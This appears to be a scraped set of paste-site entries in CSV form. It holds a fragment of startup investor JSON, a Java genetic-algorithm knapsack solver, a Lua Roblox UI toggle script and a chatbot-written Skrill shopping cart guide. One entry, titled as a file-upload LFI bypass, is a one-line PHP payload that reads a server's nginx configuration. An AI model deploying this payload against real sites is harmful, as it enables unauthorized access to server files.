        ""name"": ""Lightbank""
      },
      {
        ""is_lead_investor"": null,
        ""name"": ""LaunchCapital""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""Silicon Valley Bank""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""RRE Ventures""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""SoftBank Capital""
      },
      {
        ""is_lead_investor"": false,
        ""name"": ""IA Ventures""
      }
    ],"
PWVTwmES,lfi bypass via file upload,paperline27,PHP,Friday 19th of January 2024 07:07:29 AM CDT,<?php echo file_get_contents('/home/user/etc/nginx/nginx.conf'); ?>
nH7ynsGB,Untitled,JackOUT,Java,Friday 19th of January 2024 07:02:28 AM CDT,"package com.bcs2024.knapsack.algorithm;

import com.bcs2024.knapsack.model.CargoSpace;
import com.bcs2024.knapsack.renderer.UI;
import com.bcs2024.knapsack.util.ShapesAndRotations;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class GeneticKnapsackSolverDynamic {

    private final double MUTATION_RATE = 0.3;
    //private double dynamicMutationRate = MUTATION_RATE;
    private final double CROSSOVER_RATE = 0.8;
    private final int MAX_GENERATIONS = 10;
    private final int GENE_LENGTH = 54;
    private final Random random = new Random();
    private final int POPULATION_SIZE = 100;
    private List<Chromosome> population;
    private int[] bestSolutionRotation;
    private String[] bestSolutionGene;

    private Chromosome bestChromosome;

    private CargoSpace cargoSpace = UI.cargoSpace;

    public static void main(final String[] args) {
        /*final List<Parcel> parcels = new ArrayList<>();
        parcels.add(new Parcel(""A""));
        parcels.add(new Parcel(""B""));
        parcels.add(new Parcel(""C""));*/

        final GeneticKnapsackSolverDynamic solver = new GeneticKnapsackSolverDynamic();
        solver.solve();
    }

    public void solve() {
        bestSolutionGene = new String[GENE_LENGTH];
        bestSolutionRotation = new int[GENE_LENGTH];

        initializePopulation();

        for (int i = 0; i < MAX_GENERATIONS; i++) {
            evaluateFitness(population);
            crossover();
            mutation();
            //final double currentDiversity = calculateDiversity(population);
            //System.out.println(""Diversity after generation "" + i + "": "" + currentDiversity);
            System.out.println(""Generation: "" + i + "" done. -------------------------------------------------------------------------------"" + ""\n"");
        }

        System.out.println(""Rotation: "" + Arrays.toString(bestSolutionRotation));
        System.out.println(""Genes: "" + Arrays.toString(bestSolutionGene));
        applyBestSolution();
    }

    private void initializePopulation() {
        population = new ArrayList<>(POPULATION_SIZE);
        final String[] parcelTypes = {""A"", ""B"", ""C""}; // Define available parcel types
        final ShapesAndRotations shapesAndRotations = new ShapesAndRotations(); // To get the number of rotations

        for (int i = 0; i < POPULATION_SIZE; i++) {
            final Chromosome chromosome = new Chromosome(GENE_LENGTH);
            final String[] genes = chromosome.getGenes();
            final int[] rotations = chromosome.getRotations();

            for (int j = 0; j < GENE_LENGTH; j++) {
                // Randomly assign a parcel type
                final String parcelType = parcelTypes[random.nextInt(parcelTypes.length)];
                genes[j] = parcelType;

                // Randomly assign a rotation
                final int maxRotations = shapesAndRotations.rotationNum(parcelType);
                final int rotation = random.nextInt(maxRotations);
                rotations[j] = rotation;
            }

            chromosome.setGenes(genes);
            chromosome.setRotations(rotations);
            population.add(chromosome);
        }
    }

    private void evaluateFitness(final List<Chromosome> population) {
        final ShapesAndRotations shapes = new ShapesAndRotations();

        for (final Chromosome chromo : population) {
            int totalValue = 0;
            int countA = 0;
            int countB = 0;
            int countC = 0;
            final CargoSpace localCargoSpace = new CargoSpace();
            final int[][][] occupied = localCargoSpace.getOccupied();
            final boolean[] parcelUsed = new boolean[GENE_LENGTH]; // To track which parcels are used

            for (int x = 0; x < occupied.length; x++) {
                for (int y = 0; y < occupied[0].length; y++) {
                    for (int z = 0; z < occupied[0][0].length; z++) {
                        for (int i = 0; i < chromo.getGenes().length; i++) {
                            final String gene = chromo.getGenes()[i];
                            final int rotation = chromo.getRotationFromGene(i);
                            final int[][][] shape = shapes.getShape(gene, rotation);

                            //final Parcel parcel = new Parcel(gene, shape);
                            //final ParcelPlacement placement = new ParcelPlacement(parcel, x, y, z);

                            if (localCargoSpace.canPlace(shape, x, y, z)) {
                                localCargoSpace.placeParcel(shape, x, y, z, occupied);
                                parcelUsed[i] = true; // Mark this parcel as used

                                switch (gene) {
                                    case ""A"" -> {
                                        totalValue += 3;
                                        countA++;
                                    }
                                    case ""B"" -> {
                                        totalValue += 4;
                                        countB++;
                                    }
                                    case ""C"" -> {
                                        totalValue += 5;
                                        countC++;
                                    }
                                }
                            }
                        }
                    }
                }
            }

            final int fitness = getFitness(occupied, totalValue);
            chromo.setFitness(fitness);

            // Store the best solution
            if (bestChromosome == null || chromo.getFitness() > bestChromosome.getFitness()) {
                bestChromosome = chromo;
                bestSolutionRotation = chromo.getRotations();
                bestSolutionGene = chromo.getGenes();
            }

            System.out.println(""Chromosome Fitness: "" + chromo.getFitness());
            System.out.println(Arrays.toString(chromo.getRotations()));
            System.out.println(Arrays.toString(chromo.getGenes()));
            System.out.println(""A: "" + countA + "" B: "" + countB + "" C: "" + countC);
        }
    }

    private int getFitness(final int[][][] occupied, final int totalValue) {
        int emptySlots = 0;
        for (final int[][] slice : occupied) {
            for (final int[] row : slice) {
                for (final int cell : row) {
                    if (cell == -1) {
                        emptySlots++;
                    }
                }
            }
        }

        // Parameters for weighing the importance of space utilization
        final double spaceUtilizationWeight = 0.5; // Can be adjusted
        final double valueWeight = 1.0 - spaceUtilizationWeight;

        return (int) (valueWeight * totalValue - spaceUtilizationWeight * emptySlots);
    }

    private Chromosome tournamentSelection(final int tournamentSize) {
        final List<Chromosome> tournamentParticipants = new ArrayList<>();

        if (tournamentSize > population.size() || tournamentSize < 1) {
            throw new IllegalArgumentException(""Tournament size should be between 1 and population size."");
        }

        for (int i = 0; i < tournamentSize; i++) {
            tournamentParticipants.add(population.get(random.nextInt(population.size())));
        }

        Chromosome winner = tournamentParticipants.get(0);
        for (final Chromosome participant : tournamentParticipants) {
            if (participant.getFitness() > winner.getFitness()) {
                winner = participant;
            }
        }

        return winner;
    }

    private void crossover() {
        final List<Chromosome> newPopulation = new ArrayList<>();
        //final double preCrossoverDiversity = calculateDiversity(population);

        // Loop to create offspring in pairs
        for (int i = 0; i < POPULATION_SIZE; i += 2) {
            final Chromosome parent1 = tournamentSelection(2);
            final Chromosome parent2 = tournamentSelection(2);

            final Chromosome offspring1 = new Chromosome(GENE_LENGTH);
            final Chromosome offspring2 = new Chromosome(GENE_LENGTH);

            int crossoverPoint1 = random.nextInt(GENE_LENGTH);
            int crossoverPoint2 = random.nextInt(GENE_LENGTH);

            // Ensure crossoverPoint1 is less than crossoverPoint2
            if (crossoverPoint1 > crossoverPoint2) {
                final int temp = crossoverPoint1;
                crossoverPoint1 = crossoverPoint2;
                crossoverPoint2 = temp;
            }

            if (random.nextDouble() <= CROSSOVER_RATE) {
                for (int j = 0; j < GENE_LENGTH; j++) {
                    if (j < crossoverPoint1 || j > crossoverPoint2) {
                        offspring1.getGenes()[j] = parent1.getGenes()[j];
                        offspring1.getRotations()[j] = parent1.getRotations()[j];

                        offspring2.getGenes()[j] = parent2.getGenes()[j];
                        offspring2.getRotations()[j] = parent2.getRotations()[j];
                    } else {
                        offspring1.getGenes()[j] = parent2.getGenes()[j];
                        offspring1.getRotations()[j] = parent2.getRotations()[j];

                        offspring2.getGenes()[j] = parent1.getGenes()[j];
                        offspring2.getRotations()[j] = parent1.getRotations()[j];
                    }
                }
            } else {
                offspring1.setGenes(parent1.getGenes().clone());
                offspring1.setRotations(parent1.getRotations().clone());

                offspring2.setGenes(parent2.getGenes().clone());
                offspring2.setRotations(parent2.getRotations().clone());
            }

            if (isValid(offspring1)) {
                newPopulation.add(offspring1);
            } else {
                final Chromosome offspringRepaired = new Chromosome(GENE_LENGTH);
                newPopulation.add(offspringRepaired);
            }

            if (isValid(offspring2)) {
                newPopulation.add(offspring2);
            } else {
                final Chromosome offspringRepaired2 = new Chromosome(GENE_LENGTH);
                newPopulation.add(offspringRepaired2);
            }
        }

        population = newPopulation;
        //final double postCrossoverDiversity = calculateDiversity(population);
        //  System.out.println(""Diversity change after crossover: "" + (postCrossoverDiversity - preCrossoverDiversity));

        // Adapt mutation rate based on diversity change
        //adaptMutationRate(preCrossoverDiversity, postCrossoverDiversity);
    }

    private void mutation() {
        // final double preMutationDiversity = calculateDiversity(population);

        for (final Chromosome chromo : population) {
            if (random.nextDouble() < MUTATION_RATE) { // Use dynamicMutationRate
                final int index = random.nextInt(GENE_LENGTH);
                final String[] types = {""A"", ""B"", ""C""};
                final String newType = types[random.nextInt(types.length)];

                chromo.getGenes()[index] = newType;

                final ShapesAndRotations shapesAndRotations = new ShapesAndRotations();
                final int newRotation = random.nextInt(shapesAndRotations.rotationNum(newType));
                chromo.getRotations()[index] = newRotation;
            }
        }
        // final double postMutationDiversity = calculateDiversity(population);
        //System.out.println(""Diversity change after mutation: "" + (postMutationDiversity - preMutationDiversity));

        // Adapt mutation rate based on diversity change
        //adaptMutationRate(preMutationDiversity, postMutationDiversity);
    }

    /*private void adaptMutationRate(final double preDiversity, final double postDiversity) {
        if (postDiversity < preDiversity) {
            // If diversity has decreased, increase the mutation rate to introduce more diversity
            dynamicMutationRate = Math.min(dynamicMutationRate + 0.1, 1.0);
        } else {
            // If diversity has increased or stayed the same, decrease the mutation rate to allow the population to stabilize
            dynamicMutationRate = Math.max(dynamicMutationRate - 0.05, 0.1);
        }
        System.out.println(""Adapted Mutation Rate: "" + dynamicMutationRate);
    }

    private double calculateShapeDiversity(final List<CargoSpace> population) {
        final Set<int[][][]> uniqueShapes = new HashSet<>();
        for (final CargoSpace cargoSpace : population) {
            for (final ParcelPlacement placement : cargoSpace.getPlacements()) {
                final int[][][] shapeSignature = getShapeSignature(placement);
                uniqueShapes.add(shapeSignature);
            }
        }

        return uniqueShapes.size();
    }

    private int[][][] getShapeSignature(final ParcelPlacement placement) {
        return placement.getShape();
    }

    private double calculatePositionalDiversity(final List<CargoSpace> population) {
        double totalDistance = 0.0;
        int comparisons = 0;

        for (int i = 0; i < population.size() - 1; i++) {
            for (int j = i + 1; j < population.size(); j++) {
                final CargoSpace space1 = population.get(i);
                final CargoSpace space2 = population.get(j);
                // Compare placements in space1 and space2
                for (final ParcelPlacement placement1 : space1.getPlacements()) {
                    for (final ParcelPlacement placement2 : space2.getPlacements()) {
                        if (Arrays.deepEquals(getShapeSignature(placement1), getShapeSignature(placement2))) {
                            totalDistance += calculateDistance(placement1, placement2);
                            comparisons++;
                        }
                    }
                }
            }
        }

        return comparisons > 0 ? totalDistance / comparisons : 0;
    }

    private double calculateDistance(final ParcelPlacement placement1, final ParcelPlacement placement2) {
        // Euclidean distance between two parcel placements
        return Math.sqrt(Math.pow(placement1.getX() - placement2.getX(), 2) +
                Math.pow(placement1.getY() - placement2.getY(), 2) +
                Math.pow(placement1.getZ() - placement2.getZ(), 2));
    }

    private double calculateDiversity(final List<Chromosome> chromosomePopulation) {
        // Convert each chromosome to a corresponding CargoSpace
        final List<CargoSpace> cargoSpacePopulation = new ArrayList<>();
        for (final Chromosome chromosome : chromosomePopulation) {
            cargoSpacePopulation.add(chromosomeToCargoSpace(chromosome));
        }

        // Now calculate diversity based on the CargoSpace objects
        final double shapeDiversityScore = calculateShapeDiversity(cargoSpacePopulation);
        final double positionalDiversityScore = calculatePositionalDiversity(cargoSpacePopulation);

        // Combine the scores. Adjust the weights if necessary.
        return shapeDiversityScore * 0.5 + positionalDiversityScore * 0.5;
    }

    private CargoSpace chromosomeToCargoSpace(final Chromosome chromosome) {
        final CargoSpace cargoSpace = new CargoSpace();
        final ShapesAndRotations shapes = new ShapesAndRotations();

        for (int i = 0; i < chromosome.getGenes().length; i++) {
            final String gene = chromosome.getGenes()[i];
            final int rotation = chromosome.getRotationFromGene(i);
            final int[][][] shape = shapes.getShape(gene, rotation);

            // Find a place to put the parcel. This is a simplified placement logic.
            // You might have a more complex placement strategy.
            for (int x = 0; x < cargoSpace.getOccupied().length; x++) {
                for (int y = 0; y < cargoSpace.getOccupied()[0].length; y++) {
                    for (int z = 0; z < cargoSpace.getOccupied()[0][0].length; z++) {
                        final Parcel parcel = new Parcel(gene, shape);
                        final ParcelPlacement placement = new ParcelPlacement(parcel, x, y, z);
                        if (cargoSpace.canPlace(placement)) {
                            cargoSpace.placeParcel(placement);
                            // Break the loops after placing the parcel
                            x = cargoSpace.getOccupied().length;
                            y = cargoSpace.getOccupied()[0].length;
                            z = cargoSpace.getOccupied()[0][0].length;
                        }
                    }
                }
            }
        }

        return cargoSpace;
    }*/

    private boolean isValid(final Chromosome chromo) {
        final ShapesAndRotations shapes = new ShapesAndRotations();
        int totalValue = 0;
        final CargoSpace cargoSpace = new CargoSpace();
        final int[][][] occupied = cargoSpace.getOccupied();

        for (int x = 0; x < occupied.length; x++) {
            for (int y = 0; y < occupied[0].length; y++) {
                for (int z = 0; z < occupied[0][0].length; z++) {
                    for (int i = 0; i < chromo.getGenes().length; i++) {
                        final String gene = chromo.getGenes()[i];
                        final int rotation = chromo.getRotationFromGene(i);
                        final int[][][] shape = shapes.getShape(gene, rotation);
                        if (cargoSpace.canPlace(shape, x, y, z)) {
                            if (""A"".equals(gene)) {
                                totalValue += 3;
                            } else if (""B"".equals(gene)) {
                                totalValue += 4;
                            } else if (""C"".equals(gene)) {
                                totalValue += 5;
                            }
                        }
                    }
                }
            }
        }

        return totalValue > 0;
    }

    private void applyBestSolution() {
        if (bestChromosome == null) {
            System.out.println(""No optimal solution found."");
            return;
        }
        final CargoSpace bestCargoSpace = new CargoSpace();
        final ShapesAndRotations shapes = new ShapesAndRotations();
        final int[][][] occupied = bestCargoSpace.getOccupied();

        // Use the best chromosome to set the cargo space fields
        for (int i = 0; i < bestChromosome.getGenes().length; i++) {
            final String gene = bestChromosome.getGenes()[i];
            final int rotation = bestChromosome.getRotationFromGene(i);
            final int[][][] shape = shapes.getShape(gene, rotation);

            boolean placed = false;
            for (int x = 0; x < occupied.length && !placed; x++) {
                for (int y = 0; y < occupied[0].length && !placed; y++) {
                    for (int z = 0; z < occupied[0][0].length && !placed; z++) {

                        /*final Parcel parcel = new Parcel(gene);
                        parcel.setShape(shape);
                        final ParcelPlacement placement = new ParcelPlacement(parcel, x, y, z);*/

                        if (bestCargoSpace.canPlace(shape, x, y, z)) {
                            bestCargoSpace.placeParcel(shape, x, y, z, occupied);
                            placed = true; // Parcel placed, move to next parcel
                        }
                    }
                }
            }

            if (!placed) {
                System.out.println(""Could not place parcel: "" + gene);
            }
        }

        System.out.println(""Best solution: "" + bestChromosome.getFitness());
        cargoSpace.setOccupied(occupied); // Reflect the best solution in the CargoSpace
        System.out.println(Arrays.deepToString(cargoSpace.getOccupied()));
    }

}
"
7FNTBrxA,Close,Peluchecoman,Lua,Friday 19th of January 2024 06:57:19 AM CDT,"if game:GetService(""Players"").LocalPlayer.PlayerGui:FindFirstChild(""RayfieldToggleScreen"") then
    game:GetService(""Players"").LocalPlayer.PlayerGui:FindFirstChild(""RayfieldToggleScreen""):Destroy()
end

local existingUI = game:GetService(""CoreGui""):FindFirstChild(""RayfieldToggleScreen"")

if existingUI then
    existingUI:Destroy()
end

local RayfieldScreen   = Instance.new(""ScreenGui"")
local RayfieldToggleUI = Instance.new(""TextButton"")
local RayfieldCornerUI = Instance.new(""UICorner"")
local RayfieldImageUI  = Instance.new(""ImageLabel"")
RayfieldScreen.Name = ""RayfieldToggleScreen""
RayfieldScreen.Parent = game.CoreGui
RayfieldScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

RayfieldToggleUI.Name = ""RayfieldToggleUI""
RayfieldToggleUI.Parent = RayfieldScreen
RayfieldToggleUI.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
RayfieldToggleUI.BorderSizePixel = 0
RayfieldToggleUI.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
RayfieldToggleUI.Size = UDim2.new(0, 60, 0, 60)  -- Tamaño ajustado para que parezca un círculo y más pequeño
RayfieldToggleUI.Font = Enum.Font.SourceSans
RayfieldToggleUI.Text = """"
RayfieldToggleUI.TextColor3 = Color3.fromRGB(0, 0, 0)
RayfieldToggleUI.Draggable = true
RayfieldToggleUI.MouseButton1Click:Connect(function()
    if Debounce then return end
    if Hidden then
        Hidden = false
        Unhide()
    else
        if not SearchHided then
            spawn(CloseSearch)
        end
        Hidden = true
        Hide()
    end
end)

RayfieldCornerUI.Name = ""RayfieldCornerUI""
RayfieldCornerUI.Parent = RayfieldToggleUI
RayfieldImageUI.Name = ""RayfieldImageUI""
RayfieldImageUI.Parent = RayfieldToggleUI
RayfieldImageUI.BackgroundColor3 = Color3.fromRGB(192, 192, 192)
RayfieldImageUI.BackgroundTransparency = 1.000
RayfieldImageUI.BorderSizePixel = 0
RayfieldImageUI.Position = UDim2.new(0.0, 0, 0.0, 0)
RayfieldImageUI.Size = UDim2.new(0, 60, 0, 60)
RayfieldImageUI.Image = ""http://www.roblox.com/asset/?id=14435896466""

local UserInputService = game:GetService(""UserInputService"")
local isDragging = false
local startPos
local offset

RayfieldToggleUI.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        startPos = input.Position
        offset = RayfieldToggleUI.Position - UDim2.new(0, startPos.X, 0, startPos.Y)
    end
end)

RayfieldToggleUI.InputChanged:Connect(function(input)
    if isDragging and input.UserInputType == Enum.UserInputType.Touch then
        local newPos = UDim2.new(0, input.Position.X, 0, input.Position.Y) + offset
        RayfieldToggleUI.Position = newPos
    end
end)

RayfieldToggleUI.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

UserInputService.InputBegan:Connect(function(input, processed)
    if (input.KeyCode == Enum.KeyCode.F and not processed) then
        if Debounce then return end
        if Hidden then
            Hidden = false
            Unhide()
        else
            Hidden = true
            Hide()
        end
    end
end)
"
LuMfnkdz,chatgpt dummy shopping cart skrill -paypal test,plirof2,JavaScript,Friday 19th of January 2024 06:53:54 AM CDT,"I want to create a simple shopping cart in javascript that accepts payments using skrill

To create a simple shopping cart in JavaScript that accepts payments using Skrill, you'll need to have a basic understanding of HTML, CSS, and JavaScript. Here's a step-by-step guide to get started:

1. Set up your HTML structure:
   ```html
   <!DOCTYPE html>
   <html lang=""en"">
   <head>
       <meta charset=""UTF-8"">
       <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
       <title>Simple Shopping Cart</title>
   </head>
   <body>
       <h1>Simple Shopping Cart</h1>
       <div id=""cart""></div>
       <button id=""checkout-btn"">Checkout</button>
   </body>
   </html>
   ```

2. Style your shopping cart using CSS or a CSS framework like Bootstrap.

3. In JavaScript, create an array to store the cart items and a function to update the UI:
   ```javascript
   // Cart items array
   let cartItems = [];

   function updateCartUI() {
       const cartDiv = document.getElementById('cart');
       cartDiv.innerHTML = """"; // Clear cart before updating

       // Render cart items
       cartItems.forEach(item => {
           const itemDiv = document.createElement('div');
           itemDiv.innerHTML = `${item.name} - $${item.price}`;
           cartDiv.appendChild(itemDiv);
       });
   }
   ```

4. Implement the ""Add to Cart"" button functionality:
   ```javascript
   // Add to cart button event listener
   const addToCartButton = document.getElementById('add-to-cart-btn');
   addToCartButton.addEventListener('click', () => {
       const name = prompt(""Enter item name:"");
       const price = parseFloat(prompt(""Enter item price:""));
       const newItem = { name, price };
       cartItems.push(newItem);
       updateCartUI();
   });
   ```

5. Implement the ""Checkout"" button functionality:
   ```javascript
   // Checkout button event listener
   const checkoutButton = document.getElementById('checkout-btn');
   checkoutButton.addEventListener('click', () => {
       // Here, you can redirect the user to Skrill payment page
       // You'll need a Skrill Merchant ID and a payment URL
       // You can generate a payment URL using the Skrill API

       // Example code
       const skrillMerchantId = 'YOUR_SKRILL_MERCHANT_ID';
       const paymentUrl = `https://pay.skrill.com?pay_to_email=${skrillMerchantId}&amount=1000&currency=USD`;

       window.location.href = paymentUrl;
   });
   ```

Remember to replace `'YOUR_SKRILL_MERCHANT_ID'` with your actual Skrill Merchant ID.

This is a basic implementation that allows you to add items to the cart and initiate the Skrill payment process. You'll need to handle the payment completion and update your system accordingly on the server-side."
